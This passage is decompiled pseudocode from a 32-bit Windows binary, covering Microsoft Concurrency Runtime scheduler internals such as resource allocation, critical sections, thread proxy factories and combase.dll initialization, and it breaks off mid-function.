unsigned int __thiscall sub_455776(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // ecx
  unsigned int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // esi
  int v7; // ebx
  unsigned __int64 v8; // rax
  unsigned int v9; // esi

  v3 = 0;
  v4 = this[35];
  v5 = this[39];
  if ( v4 > v5 )
  {
    v6 = this[36];
    v7 = this[41];
    v8 = v4 - v5;
    if ( v7 * v6 < (unsigned int)v8 )
    {
      LODWORD(v8) = v8 - v7 * v6;
      v3 = v7 + v8 / (v6 - 1);
    }
    else
    {
      v3 = (unsigned int)v8 / v6;
    }
  }
  v9 = v3 + this[40];
  if ( v9 >= sub_44B917(this) )
    v9 = sub_44B917(this);
  if ( v9 >= a2 )
    return a2;
  return v9;
}

//----- (004557E6) --------------------------------------------------------
int __thiscall sub_4557E6(void *this, int a2)
{
  int result; // eax
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  result = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( !result )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 28))(this, a2);
  return result;
}

//----- (00455842) --------------------------------------------------------
void __thiscall sub_455842(_DWORD *this)
{
  _DWORD *v1; // eax
  unsigned int v2; // edx
  int v3; // ebx
  unsigned int v4; // esi
  int v5; // ecx
  int v6; // edx
  int v7; // ebx
  int v8; // ebx
  int v9; // edi
  int v10; // edi
  int v12; // [esp+4h] [ebp-14h]
  unsigned int v13; // [esp+8h] [ebp-10h]
  unsigned int v14; // [esp+Ch] [ebp-Ch]
  int v15; // [esp+10h] [ebp-8h]
  int v16; // [esp+14h] [ebp-4h]

  v1 = this;
  v2 = 0;
  v13 = 0;
  if ( this[48] )
  {
    v3 = 0;
    v12 = 0;
    do
    {
      v4 = 0;
      v5 = v3 + v1[4];
      v14 = 0;
      v15 = v5;
      if ( *(_DWORD *)(v5 + 4) )
      {
        v6 = 0;
        v16 = 0;
        do
        {
          v7 = *(_DWORD *)(*(_DWORD *)(v5 + 48) + v6 + 16);
          if ( v7 )
          {
            v8 = *(_DWORD *)(v7 + 56);
            if ( v8 )
            {
              do
              {
                v9 = v8;
                if ( v8 == *(_DWORD *)(*(_DWORD *)(v5 + 48) + v6 + 16) )
                  v8 = 0;
                else
                  v8 = *(_DWORD *)(v8 + 56);
                v10 = *(_DWORD *)(v9 + 28);
                sub_45C150(v10);
                (*(void (__thiscall **)(int))(*(_DWORD *)v10 + 36))(v10);
                v5 = v15;
                v6 = v16;
              }
              while ( v8 );
              v4 = v14;
            }
          }
          ++v4;
          v6 += 52;
          v14 = v4;
          v16 = v6;
        }
        while ( v4 < *(_DWORD *)(v5 + 4) );
        v1 = this;
        v2 = v13;
        v3 = v12;
      }
      ++v2;
      v3 += 52;
      v13 = v2;
      v12 = v3;
    }
    while ( v2 < v1[48] );
  }
  sub_44775B((void *)v1[14]);
}

//----- (0045590B) --------------------------------------------------------
_DWORD *__thiscall sub_45590B(void *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi

  v4 = operator new(0x3Cu);
  v5 = 0;
  if ( v4 )
    v5 = sub_454A6E(v4, (int)this, a2, a3);
  sub_454B9C(v5);
  return v5;
}

//----- (00455952) --------------------------------------------------------
int __thiscall sub_455952(char *this, int a2)
{
  int v3; // ebx
  struct _RTL_CRITICAL_SECTION *v4; // esi
  int v5; // eax
  int v6; // ecx
  int v7; // ebx
  int v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11; // ecx
  int v12; // edi
  char pExceptionObject[12]; // [esp+10h] [ebp-24h] BYREF
  char *v15; // [esp+1Ch] [ebp-18h]
  int v16; // [esp+20h] [ebp-14h]
  char *v17; // [esp+24h] [ebp-10h]
  int v18; // [esp+30h] [ebp-4h]

  v17 = this;
  v3 = __RTDynamicCast(
         a2,
         0,
         &Concurrency::IExecutionResource `RTTI Type Descriptor',
         &Concurrency::details::ExecutionResource `RTTI Type Descriptor',
         0);
  if ( !v3 )
  {
    v3 = a2 + 8;
    if ( *(char **)(a2 + 28) != this )
    {
      sub_42E473(pExceptionObject, (int)"pExecutionResource");
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
  }
  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  v15 = this + 32;
  sub_44A1E8((LPCRITICAL_SECTION)(this + 32));
  v5 = 52 * *(_DWORD *)(v3 + 36);
  v6 = *((_DWORD *)this + 4);
  v7 = *(_DWORD *)(v3 + 40);
  v18 = 0;
  v8 = v5 + v6;
  v9 = *(_DWORD *)this;
  v16 = v8;
  v10 = (*(int (__thiscall **)(char *, int, int))(v9 + 24))(v17, v8, v7);
  v11 = v16;
  v12 = v10;
  *(_BYTE *)(v10 + 69) = 1;
  sub_455680((_DWORD *)(52 * v7 + *(_DWORD *)(v11 + 48) + 12), v10 + 8);
  v18 = 1;
  sub_44A32E(v4);
  return v12;
}

//----- (00455A10) --------------------------------------------------------
_DWORD *__thiscall sub_455A10(void *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax

  v4 = operator new(0x58u);
  result = 0;
  if ( v4 )
    return sub_45C180(v4, (int)this, a2, a3);
  return result;
}

//----- (00455A48) --------------------------------------------------------
unsigned int __thiscall sub_455A48(_DWORD *this, int a2)
{
  unsigned int result; // eax
  int v3; // edx

  result = *(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + this[4] + 48);
  if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(result + 52 * *(_DWORD *)(a2 + 40) + 24), 0xFFFFFFFF) )
  {
    v3 = this[3];
    result = this[32] == this[33];
    if ( *(_DWORD *)(v3 + 16) > result )
      return SetEvent(*(HANDLE *)(v3 + 80));
  }
  return result;
}

//----- (00455A92) --------------------------------------------------------
char __thiscall sub_455A92(_DWORD *this, int a2, int a3, char a4)
{
  int v4; // ebx
  int v6; // ecx
  int v7; // eax
  int v8; // edi

  v4 = 52 * a2;
  v6 = 52 * a3;
  v7 = this[4];
  v8 = 52 * a3 + *(_DWORD *)(v7 + 52 * a2 + 48);
  if ( a4 )
  {
    --*(_DWORD *)(v8 + 44);
    --this[45];
  }
  if ( (*(_DWORD *)(v8 + 40))-- == 1 )
  {
    v7 = v4 + this[4];
    --this[43];
    --*(_DWORD *)(v7 + 36);
    if ( *(_BYTE *)(v8 + 50) )
    {
      LOBYTE(v7) = sub_4563E9(this, v7, a3);
      v6 = 52 * a3;
      *(_BYTE *)(v8 + 50) = 0;
    }
    if ( a4 )
    {
      v7 = *(_DWORD *)(this[4] + v4 + 48);
      if ( !*(_DWORD *)(v7 + v6 + 36) )
        --this[46];
    }
  }
  return v7;
}

//----- (00455B0B) --------------------------------------------------------
void __thiscall sub_455B0B(char *Block)
{
  if ( Block )
  {
    sub_45550A(Block);
    sub_44775B(Block);
  }
}

//----- (00455B26) --------------------------------------------------------
void __thiscall sub_455B26(int this, _DWORD *Block)
{
  int v3; // esi
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  int v7; // [esp+10h] [ebp-18h]
  int v8; // [esp+14h] [ebp-14h]
  int v9; // [esp+18h] [ebp-10h]

  v3 = *(_DWORD *)(this + 16);
  v4 = 52 * Block[10];
  v9 = 52 * Block[9];
  v7 = v4;
  v5 = *(_DWORD *)(v3 + v9 + 48);
  v8 = v5;
  if ( !(*(_DWORD *)(v5 + v4 + 36) + *(_DWORD *)(v5 + v4 + 44)) )
  {
    --*(_DWORD *)(v3 + v9 + 28);
    *(_DWORD *)(v5 + v4) = 1;
    --*(_DWORD *)(this + 160);
    v6 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 12) + 72) + 40 * Block[9] + 32) + 36 * Block[10];
    --*(_DWORD *)(v6 + 16);
  }
  sub_44A1E8((LPCRITICAL_SECTION)(this + 32));
  sub_4561AC((_DWORD *)(v8 + 12 + v7), (int)Block);
  sub_44A32E((LPCRITICAL_SECTION)(this + 32));
  *Block = &Concurrency::details::ExecutionResource::`vftable';
  sub_44775B(Block);
}
// 493E04: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (00455BBF) --------------------------------------------------------
int __thiscall sub_455BBF(int this, int a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  int v4; // ebx
  int v5; // ecx

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_44A1E8((LPCRITICAL_SECTION)(this + 32));
  v4 = *(_DWORD *)(this + 16);
  v5 = *(_DWORD *)(v4 + 52 * (**(int (__thiscall ***)(int))a2)(a2) + 48);
  sub_4561AC((_DWORD *)(52 * *(_DWORD *)(a2 + 48) + 12 + v5), a2 + 8);
  if ( !*(_BYTE *)(a2 + 69) )
    --*(_DWORD *)(this + 156);
  sub_44A32E(v3);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 36))(a2);
}

//----- (00455C4E) --------------------------------------------------------
int __thiscall sub_455C4E(_DWORD *this)
{
  sub_455842(this);
  return (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
}

//----- (00455C6B) --------------------------------------------------------
LPVOID __thiscall sub_455C6B(_DWORD *this)
{
  int v1; // esi
  LPVOID v2; // eax

  v1 = 0;
  v2 = sub_44AAC3(*(_DWORD *)(this[3] + 112));
  if ( v2 && ((unsigned __int8)v2 & 3) == 0 )
    return v2;
  return (LPVOID)v1;
}

//----- (00455C88) --------------------------------------------------------
_DWORD *__thiscall sub_455C88(_DWORD *this, int a2)
{
  int (__thiscall ***v3)(_DWORD, _DWORD, _DWORD); // ebx
  _DWORD *v4; // esi

  v3 = (int (__thiscall ***)(_DWORD, _DWORD, _DWORD))this[1];
  if ( !v3 )
  {
    v3 = (int (__thiscall ***)(_DWORD, _DWORD, _DWORD))sub_4567A3((char *)(this[3] + 104));
    this[1] = v3;
  }
  v4 = (_DWORD *)(**v3)(v3, this[37], this[38]);
  sub_45C56A(v4, a2);
  return v4;
}

//----- (00455CD8) --------------------------------------------------------
_DWORD *__thiscall sub_455CD8(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi

  if ( (void *)a2[5] == this )
    return a2;
  v3 = operator new(0x3Cu);
  v4 = 0;
  if ( v3 )
    v4 = sub_454ACC(v3, (int)this, a2);
  sub_454B9C(v4);
  return v4;
}

//----- (00455D26) --------------------------------------------------------
_DWORD *__thiscall sub_455D26(int this, unsigned int a2, int a3, char a4)
{
  int v4; // ebx
  unsigned int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // esi
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // edx
  _DWORD *v13; // esi
  int v14; // ecx
  unsigned int v15; // eax
  unsigned int v16; // edx
  _DWORD *v17; // edx
  _DWORD *v18; // ecx
  char v19; // ah
  char v20; // al
  int v21; // eax
  int v22; // ecx
  int v23; // ebx
  unsigned int v24; // eax
  int v25; // edx
  _DWORD *v27; // [esp+Ch] [ebp-44h]
  unsigned int v28; // [esp+10h] [ebp-40h]
  _DWORD *v29; // [esp+14h] [ebp-3Ch]
  int v30; // [esp+18h] [ebp-38h]
  int v31; // [esp+1Ch] [ebp-34h]
  unsigned int v32; // [esp+20h] [ebp-30h]
  unsigned int v33; // [esp+24h] [ebp-2Ch]
  int v34; // [esp+28h] [ebp-28h]
  int i; // [esp+2Ch] [ebp-24h]
  _DWORD *Block; // [esp+30h] [ebp-20h]
  int v37; // [esp+34h] [ebp-1Ch]
  unsigned int v38; // [esp+38h] [ebp-18h]
  unsigned int v39; // [esp+3Ch] [ebp-14h]
  _DWORD *v40; // [esp+40h] [ebp-10h]
  unsigned int v41; // [esp+44h] [ebp-Ch]
  int v42; // [esp+48h] [ebp-8h]
  char v43; // [esp+4Dh] [ebp-3h]
  char v44; // [esp+4Eh] [ebp-2h]
  char v45; // [esp+4Fh] [ebp-1h]

  v4 = 0;
  v38 = 0;
  if ( a4 )
  {
    v6 = sub_44D60B((_DWORD *)this);
    v7 = a2;
    v8 = *(_DWORD *)(this + 184) + v6 < a2 + *(_DWORD *)(this + 160);
  }
  else
  {
    v7 = a2;
    v8 = 0;
  }
  v32 = v8;
  v9 = v8 < v7 ? v7 - v8 : 0;
  if ( !v8 || (v43 = 1, v7) )
    v43 = 0;
  v28 = -1;
  if ( a4 && !v8 )
  {
    v44 = 1;
LABEL_11:
    v37 = sub_44CCAC(*(_DWORD **)(this + 12), 0);
    goto LABEL_13;
  }
  v44 = 0;
  if ( a4 )
    goto LABEL_11;
  v37 = -1;
  v44 = 0;
LABEL_13:
  v33 = 0;
  if ( v9
    && ((v10 = *(_DWORD *)(this + 164), v11 = *(_DWORD *)(this + 144), v9 > v10)
      ? (v12 = v11 * v10 + (v11 - 1) * (v9 - v10))
      : (v12 = v9 * v11),
        (v33 = v12) != 0) )
  {
    Block = (_DWORD *)unknown_libname_86((unsigned __int64)(unsigned int)v12 >> 30 != 0 ? -1 : 4 * v12);
  }
  else
  {
    Block = 0;
  }
  v13 = 0;
  v30 = 0;
  v14 = -1;
  v45 = a4 ^ 1;
  v15 = a2;
  v16 = 0;
  v34 = 0;
  v42 = -1;
  v40 = 0;
  while ( 1 )
  {
    v39 = v16;
    if ( v38 >= v15 )
    {
      if ( v45 )
        break;
    }
    if ( v16 >= *(_DWORD *)(this + 192) )
      break;
    v17 = (_DWORD *)(v34 + *(_DWORD *)(this + 16));
    v29 = v17;
    if ( v17[6] || v17[7] )
    {
      v13 = v40;
      v41 = 0;
      for ( i = 0; ; i += 52 )
      {
        if ( v38 >= v15 && v45 || (v14 = v42, v41 >= v17[1]) )
        {
          v17[6] = 0;
          goto LABEL_65;
        }
        v18 = (_DWORD *)(i + v17[12]);
        v27 = v18;
        if ( *v18 == 3 )
          break;
        if ( *v18 != 4 )
          goto LABEL_50;
        if ( v44 )
        {
          v24 = v18[9] + v18[11];
          if ( v24 >= v28 && (v24 != v28 || v39 != v37) )
            goto LABEL_49;
          v14 = v41;
          v13 = v17;
          v28 = v24;
          v15 = a2;
          v40 = v17;
          v42 = v41;
        }
        else
        {
          if ( !v43 || v18[10] || v13 && v39 != v37 )
            goto LABEL_50;
          v14 = v41;
          v13 = v17;
          v40 = v17;
          v42 = v41;
          if ( v39 == v37 )
            v45 = 1;
        }
LABEL_51:
        ++v41;
      }
      if ( !v45 && (v38 == v15 - 1 || v37 == v39) )
      {
        v19 = 1;
        if ( v32 )
        {
          v20 = 0;
          goto LABEL_38;
        }
      }
      else
      {
        v19 = 0;
      }
      v20 = 1;
LABEL_38:
      *v18 = 4;
      ++v17[7];
      ++*(_DWORD *)(this + 160);
      if ( v19 )
      {
        v40 = v17;
        v42 = v41;
        v45 = 1;
      }
      if ( v20 )
      {
        v21 = *(_DWORD *)(this + 164);
        v22 = *(_DWORD *)(this + 144);
        v31 = v22;
        if ( v21 )
          *(_DWORD *)(this + 164) = v21 - 1;
        else
          v31 = --v22;
        v27[9] += v22;
        *(_DWORD *)(this + 176) += v22;
        if ( v22 )
        {
          v23 = v31;
          do
          {
            Block[v30++] = (*(int (__thiscall **)(int, _DWORD *, unsigned int))(*(_DWORD *)this + 24))(this, v17, v41);
            v17 = v29;
            --v23;
          }
          while ( v23 );
          v4 = 0;
        }
      }
      ++v38;
      v13 = v40;
LABEL_49:
      v15 = a2;
LABEL_50:
      v14 = v42;
      goto LABEL_51;
    }
LABEL_65:
    v16 = v39 + 1;
    v34 += 52;
  }
  if ( v33 )
  {
    sub_4556C8(this, (int)Block, v33);
    j_j__free(Block);
    v14 = v42;
  }
  if ( a4 )
  {
    if ( v44 || !v43 )
    {
      v25 = v42;
    }
    else
    {
      sub_4561E2((_DWORD *)this, (int)v13, v14);
      v25 = v42;
      *(_DWORD *)(52 * v42 + v13[12]) = 4;
      ++v13[7];
      ++*(_DWORD *)(this + 160);
    }
    return sub_45590B((void *)this, v13, v25);
  }
  return (_DWORD *)v4;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0045602B) --------------------------------------------------------
unsigned __int32 __thiscall sub_45602B(_DWORD *this, int a2)
{
  unsigned __int32 result; // eax
  int v3; // edx

  result = _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + this[4] + 48)
                                                           + 52 * *(_DWORD *)(a2 + 40)
                                                           + 24));
  if ( result == 1 )
  {
    v3 = this[3];
    result = this[32] == this[33];
    if ( *(_DWORD *)(v3 + 16) > result )
      return SetEvent(*(HANDLE *)(v3 + 80));
  }
  return result;
}

//----- (00456079) --------------------------------------------------------
char __thiscall sub_456079(_DWORD *this, int a2, int a3, char a4)
{
  int v4; // ebx
  int v6; // edi
  int v7; // ecx
  int v8; // eax

  v4 = 52 * a2;
  v6 = 52 * a3 + *(_DWORD *)(this[4] + 52 * a2 + 48);
  v7 = *(_DWORD *)(v6 + 40);
  LOBYTE(v8) = v7 + 1;
  *(_DWORD *)(v6 + 40) = v7 + 1;
  if ( v7 )
  {
    if ( a4 )
    {
LABEL_8:
      ++this[45];
      ++*(_DWORD *)(v6 + 44);
    }
  }
  else
  {
    v8 = v4 + this[4];
    ++*(_DWORD *)(v8 + 36);
    ++this[43];
    if ( *(_BYTE *)(v6 + 49) )
    {
      *(_BYTE *)(v6 + 50) = 1;
      LOBYTE(v8) = sub_4563E9(this, v8, a3);
    }
    if ( a4 )
    {
      v8 = *(_DWORD *)(this[4] + v4 + 48);
      if ( !*(_DWORD *)(v8 + 52 * a3 + 36) )
        ++this[46];
      goto LABEL_8;
    }
  }
  return v8;
}

//----- (004560FA) --------------------------------------------------------
_DWORD *__thiscall sub_4560FA(_DWORD *this)
{
  void *v1; // ebx
  LPVOID v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  unsigned int v6; // edi
  unsigned int v7; // ebx
  int v8; // edi
  int v9; // eax

  v1 = this;
  v2 = sub_44AAC3(*(_DWORD *)(this[3] + 112));
  v3 = (int)v2;
  if ( !v2 )
    return 0;
  v4 = (unsigned __int8)v2 & 3;
  if ( !v4 )
  {
    sub_454B9C((_DWORD *)v3);
    return sub_455CD8(v1, (_DWORD *)v3);
  }
  if ( v4 == 1 )
  {
    v3 = *(_DWORD *)((v3 & 0xFFFFFFFE) + 16) + 8;
    v5 = *(_DWORD *)(v3 + 28);
    if ( v5 && *(_BYTE *)(v5 + 68) )
      return 0;
    sub_454B9C((_DWORD *)v3);
  }
  else
  {
    v6 = v3 & 0xFFFFFFFD;
    v7 = v6 + 4;
    (*(void (__thiscall **)(unsigned int))(*(_DWORD *)(v6 + 4) + 16))(v6 + 4);
    v8 = *(_DWORD *)(v6 + 32);
    v9 = *(_DWORD *)(v8 + 44);
    v3 = v8 + 16;
    if ( v9 && *(_BYTE *)(v9 + 68) )
      v3 = 0;
    else
      sub_454B9C((_DWORD *)v3);
    (*(void (__thiscall **)(unsigned int))(*(_DWORD *)v7 + 20))(v7);
    v1 = this;
  }
  if ( v3 )
    return sub_455CD8(v1, (_DWORD *)v3);
  return 0;
}

//----- (004561AC) --------------------------------------------------------
int __thiscall sub_4561AC(_DWORD *this, int a2)
{
  int result; // eax

  --*this;
  *(_DWORD *)(*(_DWORD *)(a2 + 56) + 52) = *(_DWORD *)(a2 + 52);
  *(_DWORD *)(*(_DWORD *)(a2 + 52) + 56) = *(_DWORD *)(a2 + 56);
  result = this[1];
  if ( a2 == result )
  {
    if ( result == *(_DWORD *)(result + 56) )
      result = 0;
    else
      result = *(_DWORD *)(result + 52);
    this[1] = result;
  }
  return result;
}

//----- (004561E2) --------------------------------------------------------
void __thiscall sub_4561E2(_DWORD *this, int a2, int a3)
{
  int v4; // ebx
  int v5; // ecx
  struct _RTL_CRITICAL_SECTION *v6; // esi
  int v7; // eax
  int v8; // eax
  int v9; // esi
  int v10; // eax
  int v11; // ebx
  struct _RTL_CRITICAL_SECTION *v12; // [esp+10h] [ebp-1Ch]
  int v13; // [esp+14h] [ebp-18h]
  int v14; // [esp+18h] [ebp-14h] BYREF
  _DWORD *v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]

  v15 = this;
  --*(_DWORD *)(a2 + 28);
  --this[40];
  v4 = *(_DWORD *)(a2 + 48) + 52 * a3;
  v13 = v4;
  v5 = *(_DWORD *)(v4 + 36);
  *(_DWORD *)v4 = 1;
  if ( v5 == this[36] )
  {
    ++this[41];
    v5 = *(_DWORD *)(v4 + 36);
  }
  this[44] -= v5;
  *(_DWORD *)(v4 + 36) = 0;
  if ( *(_BYTE *)(v4 + 49) )
    sub_4563E9(this, a2, a3);
  v6 = (struct _RTL_CRITICAL_SECTION *)(this + 8);
  *(_BYTE *)(v4 + 48) = 0;
  v12 = v6;
  sub_44A1E8(v6);
  v16 = 0;
  v7 = *(_DWORD *)(v4 + 16);
  if ( v7 )
  {
    v8 = *(_DWORD *)(v7 + 56);
    if ( v8 )
    {
      v9 = (int)v15;
      do
      {
        if ( v8 == *(_DWORD *)(v4 + 16) )
          v15 = 0;
        else
          v15 = *(_DWORD **)(v8 + 56);
        v10 = *(_DWORD *)(v8 + 28);
        if ( v10 && !*(_BYTE *)(v10 + 68) )
        {
          *(_BYTE *)(v10 + 68) = 1;
          v11 = *(_DWORD *)(v9 + 8);
          v14 = v10;
          (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)v11 + 16))(v11, &v14, 1);
          v4 = v13;
        }
        v8 = (int)v15;
      }
      while ( v15 );
      v6 = v12;
    }
  }
  v16 = 1;
  sub_44A32E(v6);
}

//----- (004562C8) --------------------------------------------------------
void __thiscall sub_4562C8(_DWORD *this, _DWORD *Block)
{
  sub_4561AC(this + 49, (int)Block);
  if ( Block )
  {
    *Block = &Concurrency::details::ExecutionResource::`vftable';
    sub_44775B(Block);
  }
}
// 493E04: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (004562F4) --------------------------------------------------------
_DWORD *__thiscall sub_4562F4(_DWORD *this, char a2)
{
  return sub_44E2FB(this[3], this, a2);
}

//----- (00456307) --------------------------------------------------------
void __thiscall sub_456307(int this, int a2, char a3)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  int v4; // edx
  int v5; // eax
  int v6; // eax
  char *v7; // ebx
  int v8; // eax
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  int *v14; // [esp+18h] [ebp-34h]
  char v15[44]; // [esp+1Ch] [ebp-30h] BYREF
  int v16; // [esp+48h] [ebp-4h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_44A1E8((LPCRITICAL_SECTION)(this + 32));
  v16 = 0;
  v4 = 0;
  v5 = *(_DWORD *)(a2 + 12);
  if ( v5 <= 8 )
  {
    v7 = v15;
  }
  else
  {
    v6 = unknown_libname_86((unsigned __int64)(unsigned int)v5 >> 30 != 0 ? -1 : 4 * v5);
    v4 = 0;
    v7 = (char *)v6;
  }
  v8 = *(_DWORD *)(a2 + 16);
  if ( v8 )
  {
    v9 = *(_DWORD *)(v8 + 56);
    if ( v9 )
    {
      do
      {
        if ( v9 == *(_DWORD *)(a2 + 16) )
          v10 = 0;
        else
          v10 = *(_DWORD *)(v9 + 56);
        v11 = *(_DWORD *)(v9 + 28);
        if ( v11 && !*(_BYTE *)(v11 + 68) )
          *(_DWORD *)&v7[4 * v4++] = v11;
        v9 = v10;
      }
      while ( v10 );
    }
  }
  v14 = *(int **)(this + 8);
  v12 = *v14;
  if ( a3 )
    (*(void (__thiscall **)(int *, char *, int))(v12 + 24))(v14, v7, v4);
  else
    (*(void (__thiscall **)(int *, char *, int))(v12 + 20))(v14, v7, v4);
  v16 = 1;
  sub_44A32E(v3);
  if ( v7 != v15 )
    j_j__free(v7);
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (004563D5) --------------------------------------------------------
int __thiscall sub_4563D5(_DWORD *this)
{
  return sub_44EBCB(this[3], this);
}

//----- (004563DF) --------------------------------------------------------
_DWORD *__thiscall sub_4563DF(_DWORD *this)
{
  return sub_44EC9D(this[3], this);
}

//----- (004563E9) --------------------------------------------------------
char __thiscall sub_4563E9(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int v4; // esi
  char result; // al

  v3 = this[42];
  v4 = *(_DWORD *)(a2 + 48) + 52 * a3;
  if ( *(_BYTE *)(v4 + 49) )
  {
    this[42] = v3 - 1;
    --*(_DWORD *)(a2 + 32);
    result = 0;
  }
  else
  {
    this[42] = v3 + 1;
    result = 1;
    ++*(_DWORD *)(a2 + 32);
  }
  *(_BYTE *)(v4 + 49) = result;
  return result;
}

//----- (00456425) --------------------------------------------------------
int __stdcall sub_456425(int a1)
{
  int v1; // eax
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !a1 )
  {
    sub_42E473(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v1 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 8))(a1);
  return sub_45C633(v1);
}

//----- (0045646E) --------------------------------------------------------
__int32 sub_45646E()
{
  HMODULE ModuleHandleW; // eax
  FARPROC RoInitialize; // eax
  int LastError; // eax
  HMODULE v3; // eax
  FARPROC RoUninitialize; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-10h] BYREF

  dword_500078 = (int)LoadLibraryExW(L"combase.dll", 0, 0x800u);
  if ( !dword_500078 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
    goto LABEL_8;
  }
  ModuleHandleW = GetModuleHandleW(L"combase.dll");
  RoInitialize = GetProcAddress(ModuleHandleW, "RoInitialize");
  if ( !RoInitialize
    || (dword_500070 = sub_44AB76((int)RoInitialize),
        v3 = GetModuleHandleW(L"combase.dll"),
        (RoUninitialize = GetProcAddress(v3, "RoUninitialize")) == 0) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
LABEL_8:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_9:
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  dword_500074 = sub_44AB76((int)RoUninitialize);
  return _InterlockedExchange(&dword_50007C, 1);
}
// 500070: using guessed type int dword_500070;
// 500074: using guessed type int dword_500074;
// 500078: using guessed type int dword_500078;
// 50007C: using guessed type __int32 dword_50007C;
// 45646E: using guessed type _DWORD pExceptionObject[4];

//----- (0045651B) --------------------------------------------------------
int __cdecl sub_45651B(int a1)
{
  int (__thiscall *v1)(_DWORD, int); // esi

  v1 = (int (__thiscall *)(_DWORD, int))sub_44AB76(dword_500070);
  return v1(v1, a1);
}
// 500070: using guessed type int dword_500070;

//----- (0045653D) --------------------------------------------------------
int sub_45653D()
{
  int (__thiscall *v0)(_DWORD); // esi

  v0 = (int (__thiscall *)(_DWORD))sub_44AB76(dword_500074);
  return v0(v0);
}
// 500074: using guessed type int dword_500074;

//----- (00456558) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_456558(union _SLIST_HEADER *this, int a2)
{
  union _SLIST_HEADER *v3; // edi
  int v4; // ebx

  v3 = this + 1;
  this->Next.Next = (struct _SINGLE_LIST_ENTRY *)&Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';
  v4 = 4;
  *(_DWORD *)&this->Depth = *(_DWORD *)(a2 + 8);
  do
  {
    InitializeSListHead(v3++);
    --v4;
  }
  while ( v4 );
  return this;
}
// 493F08: using guessed type void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';

//----- (00456597) --------------------------------------------------------
_DWORD *__thiscall sub_456597(_DWORD *this, int a2, int a3)
{
  sub_45C759(this, a2, a3);
  *this = &Concurrency::details::FreeThreadProxy::`vftable';
  this[12] = 0;
  this[13] = 0;
  this[14] = 0;
  this[12] = 0;
  *((_WORD *)this + 26) = 0;
  return this;
}
// 493EC0: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (004565CC) --------------------------------------------------------
int __thiscall sub_4565CC(int this, int a2)
{
  int result; // eax

  sub_456558((union _SLIST_HEADER *)this, a2);
  *(_DWORD *)this = &Concurrency::details::FreeThreadProxyFactory::`vftable';
  result = this;
  *(_DWORD *)(this + 40) = 1;
  *(_BYTE *)(this + 44) = 0;
  return result;
}
// 493F34: using guessed type void *Concurrency::details::FreeThreadProxyFactory::`vftable';

//----- (004565F6) --------------------------------------------------------
char *__thiscall sub_4565F6(char *this)
{
  *(_DWORD *)this = 0;
  *((_DWORD *)this + 1) = 0;
  sub_449ED8((LPCRITICAL_SECTION)(this + 12));
  *((_DWORD *)this + 2) = sub_44AA78();
  return this;
}

//----- (0045662A) --------------------------------------------------------
void __thiscall sub_45662A(_DWORD *this)
{
  *this = &Concurrency::details::IThreadProxyFactory::`vftable';
}
// 493EDC: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (00456631) --------------------------------------------------------
void __thiscall sub_456631(_DWORD *this)
{
  int v2; // ebx

  if ( *this )
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)*this + 24))(*this);
  v2 = this[1];
  if ( v2 )
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)v2 + 24))(this[1]);
  sub_44AAB5(this[2]);
  sub_449F62((LPCRITICAL_SECTION)(this + 3));
}

//----- (004566A8) --------------------------------------------------------
_DWORD *__thiscall sub_4566A8(_DWORD *Block, char a2)
{
